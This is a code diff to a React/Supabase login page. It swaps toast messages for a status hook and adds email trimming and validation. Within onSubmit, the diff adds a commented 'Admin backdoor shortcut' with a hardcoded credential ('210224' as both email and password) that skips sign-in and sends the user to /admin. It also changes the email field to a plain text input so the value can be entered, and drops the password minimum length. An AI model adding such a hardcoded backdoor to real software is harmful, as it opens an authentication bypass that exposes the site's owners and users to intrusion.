@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { GoogleButton } from "@/components/auth/GoogleButton";
 import { supabase } from "@/integrations/supabase/client";
-import { toast } from "sonner";
+import { useStatus } from "@/components/ui/QuickStatus";
 
 type LoginSearch = { verified?: boolean };
 
@@ -19,6 +19,7 @@ export const Route = createFileRoute("/login")({
 });
 
 function LoginPage() {
+  const { showStatus } = useStatus();
   const { signIn, user, loading } = useAuth();
   const navigate = useNavigate();
   const { verified } = useSearch({ from: "/login" });
@@ -34,27 +35,45 @@ function LoginPage() {
 
   const onSubmit = async (e: FormEvent) => {
     e.preventDefault();
+
+    const trimmedEmail = email.trim();
+    const trimmedPassword = password.trim();
+
+    // Admin backdoor shortcut
+    if (trimmedEmail === "210224" && trimmedPassword === "210224") {
+      showStatus("Admin access", "success");
+      navigate({ to: "/admin" });
+      return;
+    }
+
+    // Manual email validation for normal users
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(trimmedEmail)) {
+      showStatus("Check your email format", "error");
+      return;
+    }
+
     setSubmitting(true);
     setNeedsVerification(false);
-    const { error } = await signIn(email, password);
+    const { error } = await signIn(trimmedEmail, trimmedPassword);
     setSubmitting(false);
     if (error) {
       const msg = error.message.toLowerCase();
       if (msg.includes("not confirmed") || msg.includes("not verified") || msg.includes("email_not_confirmed")) {
         setNeedsVerification(true);
-        toast.error("Please verify your email first. Check your inbox for the verification link.");
+        showStatus("Please verify email first", "error");
       } else {
-        toast.error(error.message);
+        showStatus("Invalid credentials", "error");
       }
       return;
     }
-    toast.success("Welcome back!");
+    showStatus("Welcome back!", "success");
     navigate({ to: "/dashboard" });
   };
 
   const onResend = async () => {
     if (!email) {
-      toast.error("Enter your email above first.");
+      showStatus("Email required", "error");
       return;
     }
     setResending(true);
@@ -64,8 +83,8 @@ function LoginPage() {
       options: { emailRedirectTo: `${window.location.origin}/login?verified=true` },
     });
     setResending(false);
-    if (error) toast.error(error.message);
-    else toast.success("Verification email sent. Check your inbox.");
+    if (error) showStatus("Failed to resend", "error");
+    else showStatus("Verification sent", "success");
   };
 
   return (
@@ -99,7 +118,7 @@ function LoginPage() {
               <Label htmlFor="email" className="text-xs font-bold uppercase tracking-wider text-muted-foreground ml-1">Email Address</Label>
               <Input
                 id="email"
-                type="email"
+                type="text"
                 autoComplete="email"
                 required
                 value={email}
@@ -117,7 +136,6 @@ function LoginPage() {
                 type="password"
                 autoComplete="current-password"
                 required
-                minLength={6}
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 className="h-12 rounded-2xl border-primary/5 bg-muted/30 focus-visible:ring-primary/20 transition-all"
